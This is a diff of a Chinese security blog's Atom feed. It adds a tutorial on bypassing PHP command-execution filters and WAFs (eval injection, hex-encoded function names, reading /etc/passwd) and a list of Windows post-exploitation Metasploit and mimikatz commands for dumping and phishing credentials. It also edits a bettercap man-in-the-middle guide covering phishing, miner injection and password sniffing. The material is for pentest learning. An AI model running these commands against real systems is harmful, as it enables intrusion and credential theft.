@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://myt0.com/"/>
-  <updated>2019-03-01T08:33:50.733Z</updated>
+  <updated>2019-03-03T09:57:13.062Z</updated>
   <id>http://myt0.com/</id>
   
   <author>
@@ -16,11 +16,100 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>PHP命令执行时的WAF&amp;Filter绕过方法</title>
+    <link href="http://myt0.com/2019/03/03/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CWAF-Filter%E7%BB%95%E8%BF%87/"/>
+    <id>http://myt0.com/2019/03/03/php命令执行WAF-Filter绕过/</id>
+    <published>2019-03-03T08:53:43.000Z</published>
+    <updated>2019-03-03T09:57:13.062Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>命令执行是非常危险的一种漏洞，会造成严重的信息泄露，还可能导致 getshell，本文介绍如何去绕过一些简单的防命令执行，仅仅提供一种思路，实际情况各有不同。<br>先来看一段存在命令执行漏洞的 php 代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/system|exec|passthru/'</span>, $_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'invalid syntax'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>第二行试图校验 system, exec, passthru 三个函数，但这明显是远远不够的，还有很多其他的函数可以执行命令，但这里让我们假设只有这三个，这个脚本运行于 CloudFlare WAF 之后，</p>
+<h3 id="尝试读取-etc-passwd"><a href="#尝试读取-etc-passwd" class="headerlink" title="尝试读取/etc/passwd"></a>尝试读取/etc/passwd</h3><p>我们尝试请求/cfwaf.php?code=system(“cat /etc/passwd”); 这时 WAF 拒绝了我们的请求，我们可以假设是因为 /etc/passwd 这一重要文件引起，所以我们尝试修改为”cat /etc$u/passwd”，这时候由于存在 system 关键词，会输出’invalid syntax’，接下来考虑怎么样可以避免直接使用 system。</p>
+<h3 id="php-字符串编码"><a href="#php-字符串编码" class="headerlink" title="php 字符串编码"></a>php 字符串编码</h3><p>\[0-7]{1-3}代表八进制</p>
+<p>\x[0-9A-Fa-f]{1,2}代表 16 进制</p>
+<p>\u{[0-9A-Fa-f]{1,2}}代表 Unicode 编码，通常实现为 UTF-8</p>
+<p>并不是所有人都知道这么多表示字符串的语法，再加上 php 变量函数，这将会成为我们绕过 WAF 或者 filter 的瑞士军刀。</p>
+<h3 id="php-变量函数"><a href="#php-变量函数" class="headerlink" title="php 变量函数"></a>php 变量函数</h3><p>php 支持通过变量调用函数，比如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$var(args); </span><br><span class="line"><span class="string">"string"</span>(args);</span><br></pre></td></tr></table></figure></p>
+<p>都可以当做函数调用。这也就意味着我们可以进行如下转化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"system"</span>(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"\x73\x79\x73\x74\x65\x6d"</span>(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>
+<p>第三种直接将 system 转为 16 进制来执行，这样我们做到了不直接使用 system。</p>
+<p>这种技术并不是适用于所有函数，比如 echo, print, unset(), isset(), empty(), include, require 这种类函数语句是不能用上面这种方式代替的。</p>
+<h3 id="不使用引号"><a href="#不使用引号" class="headerlink" title="不使用引号"></a>不使用引号</h3><p>代码修改为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/system|exec|passthru|[\"\']/'</span>, $_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'invalid syntax'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到我们加入了单引号和双引号的判断，这就意味着我们上面那些语句都会触发过滤。<br>幸运的是，在 PHP 里，我们表示一个字符串并不一定要用引号，比如<br><code>$a = (string)foo;</code><br>接着我们尝试如下转换：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"foo"</span>;</span><br><span class="line"><span class="keyword">echo</span> (string)<span class="string">"bar"</span>;</span><br><span class="line"><span class="keyword">echo</span> (string)hello;</span><br><span class="line"><span class="keyword">echo</span> (world);</span><br></pre></td></tr></table></figure>
+<p>执行过后你会发现连 string 都没必要使用，直接用括号就可以转换。也就是说我们执行<code>(system)(ls);</code>是被允许的，但是我们不能用 system，所以尝试字符串拼接<code>(sy.(st).em)(ls);</code>。或者我们加两个参数，绕过对于 code 参数的检测<br><code>?a=system&amp;b=ls&amp;code=$_GET[a]($_GET[b])</code><br>也就是说我们可以通过字符串拼接和变量调用两种方式来绕过。</p>
+<h3 id="get-defined-functions"><a href="#get-defined-functions" class="headerlink" title="get_defined_functions"></a>get_defined_functions</h3><p>get_defined_functions 返回一个数组，假设是$arr， 里面包含所有的内置和自定义函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$arr = get_defined_functions();</span><br><span class="line"><span class="comment"># 所有内置函数</span></span><br><span class="line">$arr[internal]</span><br><span class="line"><span class="comment"># 所有自定义函数</span></span><br><span class="line">$arr[user]</span><br></pre></td></tr></table></figure></p>
+<p>比如我们尝试执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;print_r(get_defined_functions()[internal]);&apos; | grep &apos;system&apos;</span><br></pre></td></tr></table></figure>
+<p>即可知道 system 函数是第几个函数，我这里是第 503，所以绕过上面的过滤时就可以这样：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先找到system的位置</span></span><br><span class="line">curl <span class="string">'http://test/cfwaf.php?code=get_defined_functions()[internal]'</span> | grep <span class="string">'system'</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">'http://test/cfwaf.php?code=get_defined_functions()[internal][503](whoami)'</span></span><br></pre></td></tr></table></figure>
+<h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><p>在 php 中可以用数组的形式取到字符串的每一个字符，这样我们就可以先定义一个包含所有需要的字符的字符串，然后通过下标取到字符再拼接的方式构造出我们需要的字符串。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 相当于执行(system)(ls /tmp)</span></span><br><span class="line">php -r <span class="string">'$a="elmsty/ ";($a[3].$a[5].$a[3].$a[4].$a[0].$a[2])($a[1].$a[3].$a[-1].$a[-2].tmp)'</span></span><br></pre></td></tr></table></figure>
+<p>这样在请求的时候我们可以取<strong>FILE</strong>路径名的字符来构造我们的 payload。</p>
+<p>本文参考自 <a href="https://www.exploit-db.com/docs/46049" target="_blank" rel="external">https://www.exploit-db.com/docs/46049</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;命令执行是非常危险的一种漏洞，会造成严重的信息泄露，还可能导致 getshell，本文介绍如何去绕过一些简单的防命令执行，仅仅提供一种思路，
+    
+    </summary>
+    
+    
+      <category term="security" scheme="http://myt0.com/tags/security/"/>
+    
+      <category term="php" scheme="http://myt0.com/tags/php/"/>
+    
+      <category term="bypass" scheme="http://myt0.com/tags/bypass/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>windows后渗透利用</title>
+    <link href="http://myt0.com/2019/03/03/windows%E5%90%8E%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/"/>
+    <id>http://myt0.com/2019/03/03/windows后渗透利用/</id>
+    <published>2019-03-02T20:31:18.000Z</published>
+    <updated>2019-03-03T09:59:11.434Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="获取-hash"><a href="#获取-hash" class="headerlink" title="获取 hash"></a>获取 hash</h2><h3 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure>
+<p>将 hash 值保存到文件中，然后用 john 破解：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/root/Desktop/pass.txt --format=NT /root/Desktop/hashes.txt</span><br></pre></td></tr></table></figure>
+<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ msf &gt; use post/windows/gather/hashdump</span><br><span class="line">$ msf post(hashdump) &gt; set session 2</span><br><span class="line">$ msf post(hashdump) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="smart-hashdump"><a href="#smart-hashdump" class="headerlink" title="smart_hashdump"></a>smart_hashdump</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ msf &gt; use post/windows/gather/smart_hashdump</span><br><span class="line">$ msf post(hashdump) &gt; set session 2</span><br><span class="line">$ msf post(hashdump) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="credential-collector"><a href="#credential-collector" class="headerlink" title="credential_collector"></a>credential_collector</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ msf &gt; use post/windows/gather/credentials/credential_collector</span><br><span class="line">$ msf post(credential_collector) &gt; set session 2</span><br><span class="line">$ msf post(credential_collector) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>上面 4 种得到的都是 hash，需要破解，下面看看怎么直接得到明文密码。</p>
+<h2 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h2><h3 id="sso-模块"><a href="#sso-模块" class="headerlink" title="sso 模块"></a>sso 模块</h3><p>实际上这一功能利用的是 Mimikatz 扩展。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/windows/gather/credentials/sso</span><br><span class="line">msf post(sso) &gt; set session 2</span><br><span class="line">msf post(sso) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="meterpreter-kiwi"><a href="#meterpreter-kiwi" class="headerlink" title="meterpreter kiwi"></a>meterpreter kiwi</h3><p>这也是用的 Mimikatz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>
+<h3 id="伪造登录框"><a href="#伪造登录框" class="headerlink" title="伪造登录框"></a>伪造登录框</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/windows/gather/phish_windows_credentials</span><br><span class="line">msf post(phish_windows_credentials) &gt; set session 2</span><br><span class="line">msf post(phish_windows_credentials) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>这时候会伪造假冒的登录框，对方输入密码之后我们就可以得到了。</p>
+<h2 id="更改目标密码"><a href="#更改目标密码" class="headerlink" title="更改目标密码"></a>更改目标密码</h2><h3 id="change-password"><a href="#change-password" class="headerlink" title="change_password"></a>change_password</h3><p>这种主要适用于你创建了一个新账号，但是对方账号策略强制在登录之前必须修改密码，否则你登录会报错：’System error 1907 has occurred’。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use post/windows/manage/change_password</span><br><span class="line">msf post(change_password) &gt; set smbuser raj</span><br><span class="line">msf post(change_password) &gt; set old_password 123</span><br><span class="line">msf post(change_password) &gt; set new_password 987</span><br><span class="line">msf post(change_password) &gt; set session 1</span><br><span class="line">msf post(change_password) &gt; exploit</span><br></pre></td></tr></table></figure>
+<h3 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterepreter&gt; shell</span><br><span class="line">net user</span><br><span class="line">net user raj 123</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;获取-hash&quot;&gt;&lt;a href=&quot;#获取-hash&quot; class=&quot;headerlink&quot; title=&quot;获取 hash&quot;&gt;&lt;/a&gt;获取 hash&lt;/h2&gt;&lt;h3 id=&quot;meterpreter&quot;&gt;&lt;a href=&quot;#meterpreter&quot; class=&quot;he
+    
+    </summary>
+    
+    
+      <category term="security" scheme="http://myt0.com/tags/security/"/>
+    
+      <category term="metasploit" scheme="http://myt0.com/tags/metasploit/"/>
+    
+  </entry>
+  
+  <entry>
     <title>中间人工具bettercap</title>
     <link href="http://myt0.com/2019/03/01/%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%B7%A5%E5%85%B7bettercap/"/>
     <id>http://myt0.com/2019/03/01/中间人工具bettercap/</id>
     <published>2019-03-01T07:52:51.000Z</published>
-    <updated>2019-03-01T08:33:50.733Z</updated>
+    <updated>2019-03-02T12:50:37.182Z</updated>
     
     <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>bettercap 用于中间人攻击测试，并可以应用于 wifi 网络的一些测试。</p>
 <p>官网：<a href="https://www.bettercap.org/" target="_blank" rel="external">https://www.bettercap.org/</a></p>
@@ -139,25 +228,25 @@
 <p>这里可以基于其他设置执行复杂的攻击，比如基于社会工程学的自动攻击。</p>
 <h3 id="bettercap-caplet-回顾"><a href="#bettercap-caplet-回顾" class="headerlink" title="bettercap caplet 回顾"></a>bettercap caplet 回顾</h3><p>官方自带了一些 cap 脚本，<a href="https://github.com/bettercap/caplets" target="_blank" rel="external">点击查看</a>。下面我们来看几个典型的脚本怎么使用。</p>
 <h4 id="Beef-hooking"><a href="#Beef-hooking" class="headerlink" title="Beef hooking"></a>Beef hooking</h4><p>Beef 通过与客户端的 JS 通信来控制受害者客户端，简单来说是一个 XSS 工具，不了解的可先去学习一下怎么使用 beef。<br>bettercap 提供的与 beef 相关的两个脚本是<a href="https://github.com/bettercap/caplets/blob/master/beef-passive.cap" target="_blank" rel="external">beef-passive.cap</a>， <a href="https://github.com/bettercap/caplets/blob/master/beef-active.cap" target="_blank" rel="external">beef-active.cap</a>，<br>第一个脚本被动注入 JS，第二个脚本主动注入 JS，这两个脚本都会注入<a href="https://github.com/bettercap/caplets/blob/master/beef-inject.js" target="_blank" rel="external">beef-inject.js</a>，查看源码会发现这个 js 文件网 HTML 中注入一个 JS 地址，你需要将这个 JS 地址替换为你的 Beef JS 地址。</p>
-<h3 id="矿机注入"><a href="#矿机注入" class="headerlink" title="矿机注入"></a>矿机注入</h3><p><a href="https://github.com/bettercap/caplets/blob/master/crypto-miner.cap" target="_blank" rel="external">crypto-miner.cap</a>会注入矿机，你需要修改<a href="https://github.com/bettercap/caplets/blob/master/crypto-miner.js" target="_blank" rel="external">crypto-miner.js</a>，写入你自己 key。</p>
-<h3 id="替换上传下载文件"><a href="#替换上传下载文件" class="headerlink" title="替换上传下载文件"></a>替换上传下载文件</h3><p><a href="https://github.com/bettercap/caplets/blob/master/download-autopwn.cap" target="_blank" rel="external">download-autopwn.cap</a>用于替换下载的文件，需要注意两点：</p>
+<h4 id="矿机注入"><a href="#矿机注入" class="headerlink" title="矿机注入"></a>矿机注入</h4><p><a href="https://github.com/bettercap/caplets/blob/master/crypto-miner.cap" target="_blank" rel="external">crypto-miner.cap</a>会注入矿机，你需要修改<a href="https://github.com/bettercap/caplets/blob/master/crypto-miner.js" target="_blank" rel="external">crypto-miner.js</a>，写入你自己 key。</p>
+<h4 id="替换上传下载文件"><a href="#替换上传下载文件" class="headerlink" title="替换上传下载文件"></a>替换上传下载文件</h4><p><a href="https://github.com/bettercap/caplets/blob/master/download-autopwn.cap" target="_blank" rel="external">download-autopwn.cap</a>用于替换下载的文件，需要注意两点：</p>
 <ol>
 <li>受害者发出请求的 user-agent 字段需要匹配 downloadautopwn.useragent.x regexp 的值</li>
 <li>请求的文件扩展名要匹配 downloadautopwn.extensions.x，根据这些扩展名，你可以在 caplets/download-autopwn/找到对应的 downloadautopwn.devices。<br>同时<a href="https://github.com/bettercap/caplets/blob/master/download-autopwn.js" target="_blank" rel="external">download-autopwn.js</a>文件与 download-autopwn.cap 互相配合，这个脚本并不是用于浏览器的，而是用于 http.proxy 模块，控制 bettercap 的行为。<br>执行过后，如果有人上传文件，这边匹配到了就会替换成你对应的 payload。</li>
 </ol>
-<h3 id="窃取-Facebook-密码"><a href="#窃取-Facebook-密码" class="headerlink" title="窃取 Facebook 密码"></a>窃取 Facebook 密码</h3><p><a href="https://github.com/bettercap/caplets/blob/master/fb-phish.cap" target="_blank" rel="external">fb-phish.cap</a>会在 80 端口放置一个伪造的 facebook 登录页，利用了 http.proxy 模块，有人访问登录了，就会打印捕获的密码，然后重定向到真正的 facebook。<br>这一脚本利用<a href="https://github.com/bettercap/caplets/blob/master/fb-phish.js" target="_blank" rel="external">fb-phish.js</a>文件控制 http.proxy。<br>开始之前要创建一个伪造 login 页面，可以使用 makefile 快速创建：</p>
+<h4 id="窃取-Facebook-密码"><a href="#窃取-Facebook-密码" class="headerlink" title="窃取 Facebook 密码"></a>窃取 Facebook 密码</h4><p><a href="https://github.com/bettercap/caplets/blob/master/fb-phish.cap" target="_blank" rel="external">fb-phish.cap</a>会在 80 端口放置一个伪造的 facebook 登录页，利用了 http.proxy 模块，有人访问登录了，就会打印捕获的密码，然后重定向到真正的 facebook。<br>这一脚本利用<a href="https://github.com/bettercap/caplets/blob/master/fb-phish.js" target="_blank" rel="external">fb-phish.js</a>文件控制 http.proxy。<br>开始之前要创建一个伪造 login 页面，可以使用 makefile 快速创建：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd caplets/www/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
 <p>然后发起攻击：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set http.server.address 0.0.0.0</span><br><span class="line">set http.server.path caplets/www/www.facebook.com/</span><br><span class="line"></span><br><span class="line">set http.proxy.script caplets/fb-phish.js</span><br><span class="line"></span><br><span class="line">http.proxy on</span><br><span class="line">http.server on</span><br></pre></td></tr></table></figure>
-<h3 id="收集-HTTP-请求"><a href="#收集-HTTP-请求" class="headerlink" title="收集 HTTP 请求"></a>收集 HTTP 请求</h3><p>运行 ARP 欺骗，然后利用<a href="https://github.com/bettercap/caplets/blob/master/http-req-dump.js" target="_blank" rel="external">http-req-dumsp.js</a>来导出与 http.proxy 或者 https.proxy 交互的请求包。</p>
-<h3 id="收集-Form-框自动传入数据"><a href="#收集-Form-框自动传入数据" class="headerlink" title="收集 Form 框自动传入数据"></a>收集 Form 框自动传入数据</h3><p>假如浏览器记录了上次登录的 form 框用户名密码，下次打开会自动传入或者进行一些交互之后传入，在 form 框自动传入记录的信息时我们可以利用<a href="https://github.com/bettercap/caplets/blob/master/login-man-abuse.cap" target="_blank" rel="external">login-man-abuse.cap</a>来收集这些信息。<br>例子：<a href="https://miloserdov.org/?goto=28503" target="_blank" rel="external">webpage demo</a></p>
-<h3 id="利用-DHCPv6-请求重定向-DNS-请求"><a href="#利用-DHCPv6-请求重定向-DNS-请求" class="headerlink" title="利用 DHCPv6 请求重定向 DNS 请求"></a>利用 DHCPv6 请求重定向 DNS 请求</h3><p>原理介绍：<a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank" rel="external">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a></p>
+<h4 id="收集-HTTP-请求"><a href="#收集-HTTP-请求" class="headerlink" title="收集 HTTP 请求"></a>收集 HTTP 请求</h4><p>运行 ARP 欺骗，然后利用<a href="https://github.com/bettercap/caplets/blob/master/http-req-dump.js" target="_blank" rel="external">http-req-dumsp.js</a>来导出与 http.proxy 或者 https.proxy 交互的请求包。</p>
+<h4 id="收集-Form-框自动传入数据"><a href="#收集-Form-框自动传入数据" class="headerlink" title="收集 Form 框自动传入数据"></a>收集 Form 框自动传入数据</h4><p>假如浏览器记录了上次登录的 form 框用户名密码，下次打开会自动传入或者进行一些交互之后传入，在 form 框自动传入记录的信息时我们可以利用<a href="https://github.com/bettercap/caplets/blob/master/login-man-abuse.cap" target="_blank" rel="external">login-man-abuse.cap</a>来收集这些信息。<br>例子：<a href="https://miloserdov.org/?goto=28503" target="_blank" rel="external">webpage demo</a></p>
+<h4 id="利用-DHCPv6-请求重定向-DNS-请求"><a href="#利用-DHCPv6-请求重定向-DNS-请求" class="headerlink" title="利用 DHCPv6 请求重定向 DNS 请求"></a>利用 DHCPv6 请求重定向 DNS 请求</h4><p>原理介绍：<a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank" rel="external">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a></p>
 <p>大概意思是，现代版本中的 windows 系统对 ipv6 有优先权，攻击者发送一个指定攻击者 IP 为 DNS server 的 ipv6 数据包给 windows 受害者，会起到 DNS 欺骗的效果。</p>
 <p>利用脚本<a href="https://github.com/bettercap/caplets/blob/master/mitm6.cap" target="_blank" rel="external">mitm6.cap</a>。</p>
-<h3 id="http-proxy-测试脚本"><a href="#http-proxy-测试脚本" class="headerlink" title="http.proxy 测试脚本"></a>http.proxy 测试脚本</h3><p><a href="https://github.com/bettercap/caplets/blob/master/proxy-script-test.cap" target="_blank" rel="external">proxy-script-test.cap</a>帮助你测试 js 脚本的运行，这里利用<a href="https://github.com/bettercap/caplets/blob/master/proxy-script-test.js" target="_blank" rel="external">proxy-script-test.js</a>。</p>
-<h3 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h3><p><a href="https://github.com/bettercap/caplets/blob/master/simple-passwords-sniffer.cap" target="_blank" rel="external">simple-passwords-sniffer.cap</a>利用简单的正则来截取密码。</p>
-<h3 id="自定义-bettercap-交互提示"><a href="#自定义-bettercap-交互提示" class="headerlink" title="自定义 bettercap 交互提示"></a>自定义 bettercap 交互提示</h3><p><a href="https://github.com/bettercap/caplets/blob/master/test-prompt-stats.cap" target="_blank" rel="external">test-prompt-stats.cap</a></p>
-<h3 id="改变-web-页面内容"><a href="#改变-web-页面内容" class="headerlink" title="改变 web 页面内容"></a>改变 web 页面内容</h3><p><a href="https://github.com/bettercap/caplets/blob/master/web-override.cap" target="_blank" rel="external">web-override.cap</a>可以改变为任何攻击者指定页面。利用<a href="https://github.com/bettercap/caplets/blob/master/web-override.js" target="_blank" rel="external">web-override.js</a>脚本控制 http.proxy。<br>如果你想的话，你可以创造自己的 caplet，然后提交到官方的仓库。</p>
+<h4 id="http-proxy-测试脚本"><a href="#http-proxy-测试脚本" class="headerlink" title="http.proxy 测试脚本"></a>http.proxy 测试脚本</h4><p><a href="https://github.com/bettercap/caplets/blob/master/proxy-script-test.cap" target="_blank" rel="external">proxy-script-test.cap</a>帮助你测试 js 脚本的运行，这里利用<a href="https://github.com/bettercap/caplets/blob/master/proxy-script-test.js" target="_blank" rel="external">proxy-script-test.js</a>。</p>
+<h4 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h4><p><a href="https://github.com/bettercap/caplets/blob/master/simple-passwords-sniffer.cap" target="_blank" rel="external">simple-passwords-sniffer.cap</a>利用简单的正则来截取密码。</p>
+<h4 id="自定义-bettercap-交互提示"><a href="#自定义-bettercap-交互提示" class="headerlink" title="自定义 bettercap 交互提示"></a>自定义 bettercap 交互提示</h4><p><a href="https://github.com/bettercap/caplets/blob/master/test-prompt-stats.cap" target="_blank" rel="external">test-prompt-stats.cap</a></p>
+<h4 id="改变-web-页面内容"><a href="#改变-web-页面内容" class="headerlink" title="改变 web 页面内容"></a>改变 web 页面内容</h4><p><a href="https://github.com/bettercap/caplets/blob/master/web-override.cap" target="_blank" rel="external">web-override.cap</a>可以改变为任何攻击者指定页面。利用<a href="https://github.com/bettercap/caplets/blob/master/web-override.js" target="_blank" rel="external">web-override.js</a>脚本控制 http.proxy。<br>如果你想的话，你可以创造自己的 caplet，然后提交到官方的仓库。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如你所见，bettercap 是一款强大的，非常容易实现各种中间人攻击的工具。<br>以上只是介绍了一部分用法，在实际中还需要自己多加探索。在官方文档有记载所有模块的作用。<br>本文参考自 <a href="https://miloserdov.org/?p=1112" target="_blank" rel="external">https://miloserdov.org/?p=1112</a></p>
 ]]></content>
     
@@ -366,9 +455,9 @@
     
       <category term="javascript" scheme="http://myt0.com/tags/javascript/"/>
     
-      <category term="react" scheme="http://myt0.com/tags/react/"/>
-    
       <category term="react-redux" scheme="http://myt0.com/tags/react-redux/"/>
+    
+      <category term="react" scheme="http://myt0.com/tags/react/"/>
     
       <category term="redux" scheme="http://myt0.com/tags/redux/"/>
     
